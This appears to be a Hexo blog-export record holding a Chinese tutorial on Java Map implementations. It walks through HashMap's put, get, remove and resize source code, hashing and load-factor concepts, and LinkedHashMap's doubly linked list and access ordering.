oldCap = (oldTab == null) ? 0 : oldTab.length;\n   //负载\n   int oldThr = threshold;\n   int newCap, newThr = 0;\n\n   if (oldCap > 0) {\n       //大于等于最大容量，不能继续散列扩大\n       if (oldCap >= MAXIMUM_CAPACITY) {\n           threshold = Integer.MAX_VALUE;\n           return oldTab;\n       }\n       else if ((newCap = oldCap << 1) < MAXIMUM_CAPACITY &&\n                oldCap >= DEFAULT_INITIAL_CAPACITY)\n          //扩大两倍\n           newThr = oldThr << 1; // double threshold\n   }\n   else if (oldThr > 0) // initial capacity was placed in threshold\n       newCap = oldThr;\n   //第一次初始化散列表\n   else {               // zero initial threshold signifies using defaults\n       newCap = DEFAULT_INITIAL_CAPACITY;\n       newThr = (int)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY);\n   }\n   if (newThr == 0) {\n       float ft = (float)newCap * loadFactor;\n       newThr = (newCap < MAXIMUM_CAPACITY && ft < (float)MAXIMUM_CAPACITY ?\n                 (int)ft : Integer.MAX_VALUE);\n   }\n   threshold = newThr;\n\n   //将旧的散列表复制到新的散列表\n   @SuppressWarnings({\"rawtypes\",\"unchecked\"})\n       Node<K,V>[] newTab = (Node<K,V>[])new Node[newCap];\n   table = newTab;\n   if (oldTab != null) {\n       for (int j = 0; j < oldCap; ++j) {\n           Node<K,V> e;\n           if ((e = oldTab[j]) != null) {\n               oldTab[j] = null;\n               if (e.next == null)\n                   newTab[e.hash & (newCap - 1)] = e;\n              //树     \n               else if (e instanceof TreeNode)\n                   ((TreeNode<K,V>)e).split(this, newTab, j, oldCap);\n              //链表\n               else { // preserve order\n                   Node<K,V> loHead = null, loTail = null;\n                   Node<K,V> hiHead = null, hiTail = null;\n                   Node<K,V> next;\n                   do {\n                       next = e.next;\n                       if ((e.hash & oldCap) == 0) {\n                           if (loTail == null)\n                               loHead = e;\n                           else\n                               loTail.next = e;\n                           loTail = e;\n                       }\n                       else {\n                           if (hiTail == null)\n                               hiHead = e;\n                           else\n                               hiTail.next = e;\n                           hiTail = e;\n                       }\n                   } while ((e = next) != null);\n                   if (loTail != null) {\n                       loTail.next = null;\n                       newTab[j] = loHead;\n                   }\n                   if (hiTail != null) {\n                       hiTail.next = null;\n                       newTab[j + oldCap] = hiHead;\n                   }\n               }\n           }\n       }\n   }\n   return newTab;\n}\n\n```\n\n###### 1.3.7 HashMap总结注意\n\n在散列表中有装载因子这么一个属性，当装载因子*初始容量小于散列表元素时，该散列表会再散列，扩容2倍！<br>\n\n装载因子的默认值是0.75，无论是初始大了还是初始小了对我们HashMap的性能都不好<br>\n\n- 装载因子初始值大了，可以减少散列表再散列(扩容的次数)，但同时会导致散列冲突的可能性变大(散列冲突也是耗性能的一个操作，要得操作链表(红黑树)！\n- 装载因子初始值小了，可以减小散列冲突的可能性，但同时扩容的次数可能就会变多！\n\n\n初始容量的默认值是16，它也一样，无论初始大了还是小了，对我们的HashMap都是有影响的：<br>\n\n- 初始容量过大，那么遍历时我们的速度就会受影响~\n- 初始容量过小，散列表再散列(扩容的次数)可能就变得多，扩容也是一件非常耗费性能的一件事~\n\n从源码上我们可以发现：HashMap并不是直接拿key的哈希值来用的，它会将key的哈希值的高16位进行异或操作，使得我们将元素放入哈希表的时候增加了一定的随机性。<br>\n\n还要值得注意的是：并不是桶子上有8位元素的时候它就能变成红黑树，它得同时满足我们的散列表容量大于64才行的<br>\n\n###### 1.3.8 HashTable\n\n从存储结构和实现来讲基本上都是相同的。它和HashMap的最大的不同是它是线程安全的，另外它不允许key和value为null。Hashtable是个过时的集合类，不建议在新代码中使用，不需要线程安全的场合可以用HashMap替换，需要线程安全的场合可以用ConcurrentHashMap替换<br>\n\n\n#### 2.LinkendHashMap\n\nLinkendHashMap 底层为 HashMap 和一个双向链表，保证了存储数据的有序.<br>\n\n\n##### 2.1 内部节点类\n\n```\nstatic class Entry<K,V> extends HashMap.Node<K,V> {\n    Entry<K,V> before, after;\n    Entry(int hash, K key, V value, Node<K,V> next) {\n        super(hash, key, value, next);\n    }\n}\n\n/**\n * The head (eldest) of the doubly linked list.\n */\ntransient LinkedHashMap.Entry<K,V> head;\n\n/**\n * The tail (youngest) of the doubly linked list.\n */\ntransient LinkedHashMap.Entry<K,V> tail;\n```\n可以看出，是在HashMap的节点上，添加了before/after的一个双向链表.<br>\n\n\n#### 2.2 accessOrder\n\n```\n/**\n * The iteration ordering method for this linked hash map: <tt>true</tt>\n * for access-order, <tt>false</tt> for insertion-order.\n *\n * @serial\n */\nfinal boolean accessOrder;\n\n//带accessOrder的构造方法， 不带该参数时，默认为false\npublic LinkedHashMap(int initialCapacity,\n                     float loadFactor,\n                     boolean accessOrder) {\n    super(initialCapacity, loadFactor);\n    this.accessOrder = accessOrder;\n}\n```\n\nLinkedHashMap 是有序的， accessOrder 可以控制其排序方式.<br>\n- true\n\n基于访问排序（使用 LRU 最近最少使用算法)\n\n- false\n\n基于插入排序\n\n#### 2.3 重写HashMap方法\n\n因为在HashMap的基础上，添加了双向链表，所以得重写HashMap 的部分方法<br>\n\n```\n//1.初始化散列表时，也初始化双向链表\nvoid reinitialize() {\n    super.reinitialize();\n    head = tail = null;\n}\n\n//2.创建entry时，将entry加入双向链表的末尾\n//可以看出，新节点不再是 Node 而是 Entry\nNode<K,V> newNode(int hash, K key, V value, Node<K,V> e) {\n    LinkedHashMap.Entry<K,V> p =\n        new LinkedHashMap.Entry<K,V>(hash, key, value, e);\n    linkNodeLast(p);\n    return p;\n}\n\nprivate void linkNodeLast(LinkedHashMap.Entry<K,V> p) {\n   LinkedHashMap.Entry<K,V> last = tail;\n   tail = p;\n   if (last == null)\n       head = p;\n   else {\n       p.before = last;\n       last.after = p;\n   }\n}\n```\n\n这里只是举了两个例子，其它还有很多方式也类似的重写，添上对双向链表的操作。<br>\n\n#### 2.4 构造方法\n\n```\npublic LinkedHashMap(int initialCapacity, float loadFactor) {\n   super(initialCapacity, loadFactor);\n   accessOrder = false;\n}\n\npublic LinkedHashMap(int initialCapacity) {\n   super(initialCapacity);\n   accessOrder = false;\n}\n\npublic LinkedHashMap() {\n   super();\n   accessOrder = false;\n}\n\npublic LinkedHashMap(Map<? extends K, ? extends V> m) {\n    super();\n    accessOrder = false;\n    putMapEntries(m, false);\n}\n\npublic LinkedHashMap(int initialCapacity, float loadFactor,   boolean accessOrder) {\n   super(initialCapacity, loadFactor);\n   this.accessOrder = accessOrder;\n}\n\n```\n\n#### 2.5  get()\n\n```\npublic V get(Object key) {\n   Node<K,V> e;\n   if ((e = getNode(hash(key), key)) == null)\n       return null;\n   if (accessOrder)\n       afterNodeAccess(e);\n   return e.value;\n}\n\nvoid afterNodeAccess(Node<K,V> e) { // move node to last\n    LinkedHashMap.Entry<K,V> last;\n    if (accessOrder && (last = tail) != e) {\n        LinkedHashMap.Entry<K,V> p =\n            (LinkedHashMap.Entry<K,V>)e, b = p.before, a = p.after;\n        p.after = null;\n        if (b == null)\n            head = a;\n        else\n            b.after = a;\n        if (a != null)\n            a.before = b;\n        else\n            last = b;\n        if (last == null)\n            head = p;\n        else {\n            p.before = last;\n            last.after = p;\n        }\n        tail = p;\n        ++modCount;\n    }\n}\n```\n在 accessOder的情况下， 每次 get 后  会将该元素放到双向链表最后\n","source":"_posts/java/java基础-集合2-Map.md","raw":"---\ntitle: java基础-Map\ndate: 2019-07-08 16:50:34\ntags: [java]\n---\n\n### 一.Map和Collection\n\nJava 集合类总共两大接口: Map 和 Collection<br>\n\n其中: Map 中元素是成对出现的(key, value), Collection 中元素是单独出现的.  如:<br>\n```\nMap<String,String> //true ,成对\n\nList<String> //true, 单独\nList<Map<String,String>>// true, 单独， 一个Map对象\n\nList<String, String> //false\n```\n\n### 二.主要实现类\n\n- HashMap\n- ConcurrentHashMapp\n- HashTable\n- TreeMap\n- LinkendHashMap\n\n### 三.具体实现\n\n#### 1.HashMap\n在JDK1.8中 HashMap由位桶+链表+红黑树实现.<br>\n\n##### 1.1 散列表\n\n###### 1.1.1 概念\n原文：https://www.cnblogs.com/absfree/p/5508570.html<br>\n\n符号表是一种用于存储键值对（key-value pair）的数据结构，我们平常经常使用的数组也可以看做是一个特殊的符号表，数组中的“键”即为数组索引，值为相应的数组元素。也就是说，当符号表中所有的键都是较小的整数时，我们可以使用数组来实现符号表，将数组的索引作为键，而索引处的数组元素即为键对应的值，但是这一表示仅限于所有的键都是比较小的整数时，否则可能会使用一个非常大的数组。<strong>散列表是对以上策略的一种“升级”，但是它可以支持任意的键而并没有对它们做过多的限定。</strong> <br>\n对于基于散列表实现的符号表，若我们要在其中查找一个键，需要进行以下步骤：<br>\n\n- 首先我们使用散列函数将给定键转化为一个“数组的索引”，理想情况下，不同的key会被转为不同的索引，但在实际应用中我们会遇到不同的键转为相同的索引的情况，这种情况叫做碰撞。\n\n- 得到了索引后，我们就可以像访问数组一样，通过这个索引访问到相应的键值对。\n\n\n以上就是散列表的核心思想，散列表是 <strong>时空权衡</strong> 的经典例子。当我们的空间无限大时，我们可以直接使用一个很大的数组来保存键值对，并用key作为数组索引，因为空间不受限，所以我们的键的取值可以无穷大，因此查找任何键都只需进行一次普通的数组访问。反过来，若对查找操作没有任何时间限制，我们就可以直接使用链表来保存所有键值对，这样把空间的使用降到了最低，但查找时只能顺序查找。在实际的应用中，我们的时间和空间都是有限的，所以我们必须在两者之间做出权衡，散列表就在时间和空间的使用上找到了一个很好的平衡点。散列表的一个优势在于我们只需调整散列算法的相应参数而无需对其他部分的代码做任何修改就能够在时间和空间的权衡上做出策略调整。<br>\n\n###### 1.1.2 散列函数\n\n在散列表内部，我们使用 <strong>桶（bucket）</strong>来保存键值对，我们前面所说的数组索引即为桶号，决定了给定的键存于散列表的哪个桶中。散列表所拥有的桶数被称为散列表的<strong> 容量（capacity）</strong><br>\n\n现在假设我们的散列表中有M个桶，桶号为0到M-1。我们的散列函数的功能就是把任意给定的key转为[0, M-1]上的整数。我们对散列函数有两个基本要求：一是计算时间要短，二是尽可能把键分布在不同的桶中。对于不同类型的键，我们需要使用不同的散列函数，这样才能保证有比较好的散列效果。<br>\n\n我们使用的散列函数应该尽可能满足均匀散列假设,使用的散列函数能够均匀并独立地将所有的键散布于0到M – 1之间。这样一来，满足均匀性与独立性能够保证键值对在散列表的分布尽可能的均匀，不会出现“许多键值对被散列到同一个桶，而同时许多桶为空”的情况。<br>\n\nJava中的常用类，基本都重写了 <Strong>hashCode()</strong> 方法，用于获取其散列值.<br>\n\n###### 1.1.3 获取桶号\n\n前面我们介绍了计算对象hashCode的一些方法，那么我们获取了hashCode之后，如何进一步得到桶号呢？一个直接的办法就是直接拿得到的hashCode除以capacity（桶的数量），然后用所得的余数作为桶号。不过在Java中，hashCode是int型的，而Java中的int型均为有符号，所以我们要是直接使用返回的hashCode的话可能会得到一个负数，显然桶号是不能为负的。所以我们先将返回的hashCode转变为一个非负整数，再用它除以capacity取余数，作为key的对应桶号，具体代码如下：<br>\n```\nprivate int hash(K key) {\n    return (key.hashCode() & 0x7fffffff) % M;\n}\n```\n\n###### 1.1.4 处理碰撞\n\n- 拉链法\n\n以这种方式实现的散列表，每个桶里都存放了一个链表。初始时所有链表均为空，当一个键被散列到一个桶时，这个键就成为相应桶中链表的首结点，之后若再有一个键被散列到这个桶（即发生碰撞），第二个键就会成为链表的第二个结点，以此类推。这样一来，当桶数为M，散列表中存储的键值对数目为N时，平均每个桶中的链表包含的结点数为N / M。因此，当我们查找一个键时，首先通过散列函数确定它所在的桶，这一步所需时间为O(1)；然后我们依次比较桶中结点的键与给定键，若相等则找到了指定键值对，这一步所需时间为O(N / M)。所以查找操作所需的时间为O(N / M)，而通常我们都能够保证N是M的常数倍，所以散列表的查找操作的时间复杂度为O(1)，同理我们也可以得到插入操作的复杂度也为O(1)。<br>\n\n在上面的实现中，我们固定了散列表的桶数，当我们明确知道我们要插入的键值对数目最多只能到达桶数的常数倍时，固定桶数是完全可行的。但是若键值对数目会增长到远远大于桶数，我们就需要动态调整桶数的能力。实际上，散列表中的键值对数与桶数的比值叫做负载因子（load factor）。通常负载因子越小，我们进行查找所需时间就越短，而空间的使用就越大；若负载因子较大，则查找时间会变长，但是空间使用会减小。比如，Java标准库中的HashMap就是基于拉链法实现的散列表，它的默认负载因子为0.75。HashMap实现动态调整桶数的方式是基于公式loadFactor = maxSize / capacity，其中maxSize为支持存储的最大键值对数，而loadFactor和capacity（桶数）都会在初始化时由用户指定或是由系统赋予默认值。当HashMap中的键值对的数目达到了maxSize时，就会增大散列表中的桶数。<br>\n\n- 线性探测法\n\n线性探测法是另一种散列表的实现策略的具体方法，这种策略叫做开放定址法。开放定址法的主要思想是：用大小为M的数组保存N个键值对，其中M > N，数组中的空位用于解决碰撞问题。线性探测法的主要思想是：当发生碰撞时（一个键被散列到一个已经有键值对的数组位置），我们会检查数组的下一个位置，这个过程被称作线性探测。<br>\n\n线性探测可能会产生三种结果:<br>\n命中：该位置的键与要查找的键相同；<br>\n未命中：该位置为空；<br>\n该位置的键和被查找的键不同。<br>\n\n当我们查找某个键时，首先通过散列函数得到一个数组索引后，之后我们就开始检查相应位置的键是否与给定键相同，若不同则继续查找（若到数组末尾也没找到就折回数组开头），直到找到该键或遇到一个空位置。由线性探测的过程我们可以知道，若数组已满的时候我们再向其中插入新键，会陷入无限循环之中。<br>\n\n有必要实现动态增长数组来保持查找操作的常数时间复杂度。当键值对总数很小时，若空间比较紧张，可以动态缩小数组，这取决于实际情况。<br>\n\n##### 1.2 红黑树\n\n###### 1.2.1 二叉查找树\n\n二叉查找树（Binary Search Tree），也称有序二叉树（ordered binary tree）,排序二叉树（sorted binary tree），是指一棵空树或者具有下列性质的二叉树：<br>\n\n- 若任意结点的左子树不空，则左子树上所有结点的值均小于它的根结点的值；\n- 若任意结点的右子树不空，则右子树上所有结点的值均大于它的根结点的值；\n- 任意结点的左、右子树也分别为二叉查找树。\n- 没有键值相等的结点（no duplicate nodes）。\n\n二叉查找树一般查找时间为O(lgn),当极端情况出现时，二叉树退化为一颗具有n个节点的线性链后，复杂度退化为线性O(n).\n\n###### 1.2.2 红黑树\n\n红黑树本质上是一颗二叉查找树,红黑树增加了一些性质，保证在最坏的情况下，复杂的也是O(logn).<br>\n\n- 每个结点要么是红的，要么是黑的。  \n- 根结点是黑的。  \n- 每个叶结点（叶结点即指树尾端NIL指针或NULL结点）是黑的。  \n- 如果一个结点是红的，那么它的俩个儿子都是黑的。  \n- 对于任一结点而言，其到叶结点树尾端NIL指针的每一条路径都包含相同数目的黑结点。  \n\n图片来源(https://github.com/julycoding/The-Art-Of-Programming-By-July/blob/master/ebook/zh/03.01.md)<br>\n![shu](http://67.216.218.49:8000/file/blogs/java/collection/hongheishu.png)\n\n###### 1.2.3 红黑树的操作\n\n当我们在对红黑树进行插入和删除等操作时，对树做了修改，那么可能会违背红黑树的性质。为了继续保持红黑树的性质，我们可以通过对结点进行重新着色，以及对树进行相关的旋转操作，即修改树中某些结点的颜色及指针结构，来达到对红黑树进行插入或删除结点等操作后，继续保持它的性质或平衡。<br>\n不在这里详述，单独写一篇文章<br>\n\n##### 1.3 HashMap\n\n###### 1.3.1 属性\n\n```\n//初始容量  10000(2进制)\nstatic final int DEFAULT_INITIAL_CAPACITY = 1 << 4; // aka 16\n\n//最大容量\nstatic final int MAXIMUM_CAPACITY = 1 << 30;\n\n//默认负载因子\nstatic final float DEFAULT_LOAD_FACTOR = 0.75f;\n\n//当节点中的元素个数大于该值时，桶中链表转换为树\nstatic final int TREEIFY_THRESHOLD = 8;\n\n//同上，不过是将树转化为链表表\nstatic final int UNTREEIFY_THRESHOLD = 6;\n\n//桶可能被转为树形结构时的最小容量\nstatic final int MIN_TREEIFY_CAPACITY = 64;\n\n```\n\n###### 1.3.2 构造方法\n\n```\npublic HashMap(int initialCapacity, float loadFactor) {\n   if (initialCapacity < 0)\n       throw new IllegalArgumentException(\"Illegal initial capacity: \" +\n                                          initialCapacity);\n   if (initialCapacity > MAXIMUM_CAPACITY)\n       initialCapacity = MAXIMUM_CAPACITY;\n   if (loadFactor <= 0 || Float.isNaN(loadFactor))\n       throw new IllegalArgumentException(\"Illegal load factor: \" +\n                                          loadFactor);\n   this.loadFactor = loadFactor;\n   this.threshold = tableSizeFor(initialCapacity);\n}\n\n\npublic HashMap(int initialCapacity) {\n   this(initialCapacity, DEFAULT_LOAD_FACTOR);\n}\n\n\npublic HashMap() {\n   this.loadFactor = DEFAULT_LOAD_FACTOR; // all other fields defaulted\n}\n\npublic HashMap(Map<? extends K, ? extends V> m) {\n   this.loadFactor = DEFAULT_LOAD_FACTOR;\n   putMapEntries(m, false);\n}\n\n```\n\n其中，初始化threshold时:\n\n```\nstatic final int tableSizeFor(int cap) {\n    int n = cap - 1;\n    n |= n >>> 1;\n    n |= n >>> 2;\n    n |= n >>> 4;\n    n |= n >>> 8;\n    n |= n >>> 16;\n    return (n < 0) ? 1 : (n >= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : n + 1;\n}\n```\n\n此算法原理为: <br>\n原文:https://www.cnblogs.com/loading4/p/6239441.html<br>\n通过位运算，找到大于入参的最近一个2的整数次幂<br>\n\n- 先来假设n的二进制为01xxx...xxx。接着\n\n- 对n右移1位：001xx...xxx，再位或：011xx...xxx\n\n- 对n右移2为：00011...xxx，再位或：01111...xxx\n\n- 此时前面已经有四个1了，再右移4位且位或可得8个1\n\n- 同理，有8个1，右移8位肯定会让后八位也为1。\n- 综上可得，该算法让最高位的1后面的位全变为1。\n- 最后再让结果n+1，即得到了2的整数次幂的值了\n\n<strong>threshold这个成员变量是阈值，决定了是否要将散列表再散列。它的值应该是：capacity * load_factor才对的。里仅仅是一个初始化，当创建哈希表的时候，它会重新赋值<br></strong>\n\n###### 1.3.3 增 put()\n\nHashMap的内部链表结构:<br>\n```\nstatic class Node<K,V> implements Map.Entry<K,V> {\n    final int hash;\n    final K key;\n    V value;\n    Node<K,V> next;\n\n    Node(int hash, K key, V value, Node<K,V> next) {\n        this.hash = hash;\n        this.key = key;\n        this.value = value;\n        this.next = next;\n    }\n  .....\n}\n```\n添加元素的put()方法:<br>\n```\npublic V put(K key, V value) {\n    return putVal(hash(key), key, value, false, true);\n}\n\n\nfinal V putVal(int hash, K key, V value, boolean onlyIfAbsent,\n                  boolean evict) {\n  //链表结构存储\n   Node<K,V>[] tab; Node<K,V> p; int n, i;\n   //散列表为null时  初始化\n   if ((tab = table) == null || (n = tab.length) == 0)\n       n = (tab = resize()).length;\n  //没有发生碰撞，直接存储\n   if ((p = tab[i = (n - 1) & hash]) == null)\n       tab[i] = newNode(hash, key, value, null);\n  //发生碰撞\n   else {\n       Node<K,V> e; K k;\n      //hash和key都相等，记录下来，下一步处理\n       if (p.hash == hash &&\n           ((k = p.key) == key || (key != null && key.equals(k))))\n           e = p;\n      //树形结构，调用树的方法\n       else if (p instanceof TreeNode)\n           e = ((TreeNode<K,V>)p).putTreeVal(this, tab, hash, key, value);\n      //链表结构\n       else {\n           for (int binCount = 0; ; ++binCount) {\n               //没有找到映射的节点，在链表尾部插入\n               if ((e = p.next) == null) {\n                   p.next = newNode(hash, key, value, null);\n                   //节点数大于等于TREEIFY_THRESHOLD 转为树形存储\n                   if (binCount >= TREEIFY_THRESHOLD - 1) // -1 for 1st\n                       treeifyBin(tab, hash);\n                   break;\n               }\n               //找到hash值映射的节点，插入\n               if (e.hash == hash &&\n                   ((k = e.key) == key || (key != null && key.equals(k))))\n                   break;\n               p = e;\n           }\n       }\n       //上一步的e,因为hash和key都存在，用新值覆盖旧值，返回旧值\n       if (e != null) { // existing mapping for key\n           V oldValue = e.value;\n           if (!onlyIfAbsent || oldValue == null)\n               e.value = value;\n           afterNodeAccess(e);\n           return oldValue;\n       }\n   }\n   ++modCount;\n   //检查阈值，是否再次散列\n   if (++size > threshold)\n       resize();\n   afterNodeInsertion(evict);\n   return null;\n}\n\n```\n\n###### 1.3.4 删 remove()\n\n```\npublic V remove(Object key) {\n    Node<K,V> e;\n    return (e = removeNode(hash(key), key, null, false, true)) == null ?\n        null : e.value;\n}\n\nfinal Node<K,V> removeNode(int hash, Object key, Object value,\n                           boolean matchValue, boolean movable) {\n    Node<K,V>[] tab; Node<K,V> p; int n, index;\n    //hash值指向的桶是否存在\n    if ((tab = table) != null && (n = tab.length) > 0 &&\n        (p = tab[index = (n - 1) & hash]) != null) {\n        Node<K,V> node = null, e; K k; V v;\n        //在首位进行查找，记录下找到的节点\n        if (p.hash == hash &&\n            ((k = p.key) == key || (key != null && key.equals(k))))\n            node = p;\n        //没找到，继续找\n        else if ((e = p.next) != null) {\n           //树里面找\n            if (p instanceof TreeNode)\n                node = ((TreeNode<K,V>)p).getTreeNode(hash, key);\n            else {\n              //链表里面找\n                do {\n                    if (e.hash == hash &&\n                        ((k = e.key) == key ||\n                         (key != null && key.equals(k)))) {\n                        node = e;\n                        break;\n                    }\n                    p = e;\n                } while ((e = e.next) != null);\n            }\n        }\n        //将找到的node删除\n        if (node != null && (!matchValue || (v = node.value) == value ||\n                             (value != null && value.equals(v)))) {\n            if (node instanceof TreeNode)\n                ((TreeNode<K,V>)node).removeTreeNode(this, tab, movable);\n            else if (node == p)\n                tab[index] = node.next;\n            else\n                p.next = node.next;\n            ++modCount;\n            --size;\n            afterNodeRemoval(node);\n            return node;\n        }\n    }\n    return null;\n}\n```\n\n###### 1.3.5 查 get()\n\n```\npublic V get(Object key) {\n   Node<K,V> e;\n   return (e = getNode(hash(key), key)) == null ? null : e.value;\n}\n\nfinal Node<K,V> getNode(int hash, Object key) {\n    Node<K,V>[] tab; Node<K,V> first, e; int n; K k;\n    if ((tab = table) != null && (n = tab.length) > 0 &&\n        (first = tab[(n - 1) & hash]) != null) {\n        if (first.hash == hash && // always check first node\n            ((k = first.key) == key || (key != null && key.equals(k))))\n            return first;\n        if ((e = first.next) != null) {\n            if (first instanceof TreeNode)\n                return ((TreeNode<K,V>)first).getTreeNode(hash, key);\n            do {\n                if (e.hash == hash &&\n                    ((k = e.key) == key || (key != null && key.equals(k))))\n                    return e;\n            } while ((e = e.next) != null);\n        }\n    }\n    return null;\n}\n\n```\n\n###### 1.3.6 resize()\n\nresize()对散列表进行扩容。<br>\n```\nfinal Node<K,V>[] resize() {\n   Node<K,V>[] oldTab = table;\n   //容量\n   int oldCap = (oldTab == null) ? 0 : oldTab.length;\n   //负载\n   int oldThr = threshold;\n   int newCap, newThr = 0;\n\n   if (oldCap > 0) {\n       //大于等于最大容量，不能继续散列扩大\n       if (oldCap >= MAXIMUM_CAPACITY) {\n           threshold = Integer.MAX_VALUE;\n           return oldTab;\n       }\n       else if ((newCap = oldCap << 1) < MAXIMUM_CAPACITY &&\n                oldCap >= DEFAULT_INITIAL_CAPACITY)\n          //扩大两倍\n           newThr = oldThr << 1; // double threshold\n   }\n   else if (oldThr > 0) // initial capacity was placed in threshold\n       newCap = oldThr;\n   //第一次初始化散列表\n   else {               // zero initial threshold signifies using defaults\n       newCap = DEFAULT_INITIAL_CAPACITY;\n       newThr = (int)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY);\n   }\n   if (newThr == 0) {\n       float ft = (float)newCap * loadFactor;\n       newThr = (newCap < MAXIMUM_CAPACITY && ft < (float)MAXIMUM_CAPACITY ?\n                 (int)ft : Integer.MAX_VALUE);\n   }\n   threshold = newThr;\n\n   //将旧的散列表复制到新的散列表\n   @SuppressWarnings({\"rawtypes\",\"unchecked\"})\n       Node<K,V>[] newTab = (Node<K,V>[])new Node[newCap];\n   table = newTab;\n   if (oldTab != null) {\n       for (int j = 0; j < oldCap; ++j) {\n           Node<K,V> e;\n           if ((e = oldTab[j]) != null) {\n               oldTab[j] = null;\n               if (e.next == null)\n                   newTab[e.hash & (newCap - 1)] = e;\n              //树     \n               else if (e instanceof TreeNode)\n                   ((TreeNode<K,V>)e).split(this, newTab, j, oldCap);\n              //链表\n               else { // preserve order\n                   Node<K,V> loHead = null, loTail = null;\n                   Node<K,V> hiHead = null, hiTail = null;\n                   Node<K,V> next;\n                   do {\n                       next = e.next;\n                       if ((e.hash & oldCap) == 0) {\n                           if (loTail == null)\n                               loHead = e;\n                           else\n                               loTail.next = e;\n                           loTail = e;\n                       }\n                       else {\n                           if (hiTail == null)\n                               hiHead = e;\n                           else\n                               hiTail.next = e;\n                           hiTail = e;\n                       }\n                   } while ((e = next) != null);\n                   if (loTail != null) {\n                       loTail.next = null;\n                       newTab[j] = loHead;\n                   }\n                   if (hiTail != null) {\n                       hiTail.next = null;\n                       newTab[j + oldCap] = hiHead;\n                   }\n               }\n           }\n       }\n   }\n   return newTab;\n}\n\n```\n\n###### 1.3.7 HashMap总结注意\n\n在散列表中有装载因子这么一个属性，当装载因子*初始容量小于散列表元素时，该散列表会再散列，扩容2倍！<br>\n\n装载因子的默认值是0.75，无论是初始大了还是初始小了对我们HashMap的性能都不好<br>\n\n- 装载因子初始值大了，可以减少散列表再散列(扩容的次数)，但同时会导致散列冲突的可能性变大(散列冲突也是耗性能的一个操作，要得操作链表(红黑树)！\n- 装载因子初始值小了，可以减小散列冲突的可能性，但同时扩容的次数可能就会变多！\n\n\n初始容量的默认值是16，它也一样，无论初始大了还是小了，对我们的HashMap都是有影响的：<br>\n\n- 初始容量过大，那么遍历时我们的速度就会受影响~\n- 初始容量过小，散列表再散列(扩容的次数)可能就变得多，扩容也是一件非常耗费性能的一件事~\n\n从源码上我们可以发现：HashMap并不是直接拿key的哈希值来用的，它会将key的哈希值的高16位进行异或操作，使得我们将元素放入哈希表的时候增加了一定的随机性。<br>\n\n还要值得注意的是：并不是桶子上有8位元素的时候它就能变成红黑树，它得同时满足我们的散列表容量大于64才行的<br>\n\n###### 1.3.8 HashTable\n\n从存储结构和实现来讲基本上都是相同的。它和HashMap的最大的不同是它是线程安全的，另外它不允许key和value为null。Hashtable是个过时的集合类，不建议在新代码中使用，不需要线程安全的场合可以用HashMap替换，需要线程安全的场合可以用ConcurrentHashMap替换<br>\n\n\n#### 2.LinkendHashMap\n\nLinkendHashMap 底层为 HashMap 和一个双向链表，保证了存储数据的有序.<br>\n\n\n##### 2.1 内部节点类\n\n```\nstatic class Entry<K,V> extends HashMap.Node<K,V> {\n    Entry<K,V> before, after;\n    Entry(int hash, K key, V value, Node<K,V> next) {\n        super(hash, key, value, next);\n    }\n}\n\n/**\n * The head (eldest) of the doubly linked list.\n */\ntransient LinkedHashMap.Entry<K,V> head;\n\n/**\n * The tail (youngest) of the doubly linked list.\n */\ntransient LinkedHashMap.Entry<K,V> tail;\n```\n可以看出，是在HashMap的节点上，添加了before/after的一个双向链表.<br>\n\n\n#### 2.2 accessOrder\n\n```\n/**\n * The iteration ordering method for this linked hash map: <tt>true</tt>\n * for access-order, <tt>false</tt> for insertion-order.\n *\n * @serial\n */\nfinal boolean accessOrder;\n\n//带accessOrder的构造方法， 不带该参数时，默认为false\npublic LinkedHashMap(int initialCapacity,\n                     float loadFactor,\n                     boolean accessOrder) {\n    super(initialCapacity, loadFactor);\n    this.accessOrder = accessOrder;\n}\n```\n\nLinkedHashMap 是有序的， accessOrder 可以控制其排序方式.<br>\n- true\n\n基于访问排序（使用 LRU 最近最少使用算法)\n\n- false\n\n基于插入排序\n\n#### 2.3 重写HashMap方法\n\n因为在HashMap的基础上，添加了双向链表，所以得重写HashMap 的部分方法<br>\n\n```\n//1.初始化散列表时，也初始化双向链表\nvoid reinitialize() {\n    super.reinitialize();\n    head = tail = null;\n}\n\n//2.创建entry时，将entry加入双向链表的末尾\n//可以看出，新节点不再是 Node 而是 Entry\nNode<K,V> newNode(int hash, K key, V value, Node<K,V> e) {\n    LinkedHashMap.Entry<K,V> p =\n        new LinkedHashMap.Entry<K,V>(hash, key, value, e);\n    linkNodeLast(p);\n    return p;\n}\n\nprivate void linkNodeLast(LinkedHashMap.Entry<K,V> p) {\n   LinkedHashMap.Entry<K,V> last = tail;\n   tail = p;\n   if (last == null)\n       head = p;\n   else {\n       p.before = last;\n       last.after = p;\n   }\n}\n```\n\n这里只是举了两个例子，其它还有很多方式也类似的重写，添上对双向链表的操作。<br>\n\n#### 2.4 构造方法\n\n```\npublic LinkedHashMap(int initialCapacity, float loadFactor) {\n   super(initialCapacity, loadFactor);\n   accessOrder = false;\n}\n\npublic LinkedHashMap(int initialCapacity) {\n   super(initialCapacity);\n   accessOrder = false;\n}\n\npublic LinkedHashMap() {\n   super();\n   accessOrder = false;\n}\n\npublic LinkedHashMap(Map<? extends K, ? extends V> m) {\n    super();\n    accessOrder = false;\n    putMapEntries(m, false);\n}\n\npublic LinkedHashMap(int initialCapacity, float loadFactor,   boolean accessOrder) {\n   super(initialCapacity, loadFactor);\n   this.accessOrder = accessOrder;\n}\n\n```\n\n#### 2.5  get()\n\n```\npublic V get(Object key) {\n   Node<K,V> e;\n   if ((e = getNode(hash(key), key)) == null)\n       return null;\n   if (accessOrder)\n       afterNodeAccess(e);\n   return e.value;\n}\n\nvoid afterNodeAccess(Node<K,V> e) { // move node to last\n    LinkedHashMap.Entry<K,V> last;\n    if (accessOrder && (last = tail) != e) {\n        LinkedHashMap.Entry<K,V> p =\n            (LinkedHashMap.Entry<K,V>)e, b = p.before, a = p.after;\n        p.after = null;\n        if (b == null)\n            head = a;\n        else\n            b.after = a;\n        if (a != null)\n            a.before = b;\n        else\n            last = b;\n        if (last == null)\n            head = p;\n        else {\n            p.before = last;\n            last.after = p;\n        }\n        tail = p;\n        ++modCount;\n    }\n}\n```\n在 accessOder的情况下， 每次 get 后  会将该元素放到双向链表最后\n","slug":"java/java基础-集合2-Map","published":1,"updated":"2019-10-13T12:15:12.172Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321m0005g6dcp03z8u23e","content":"<h3 id=\"一-Map和Collection\"><a 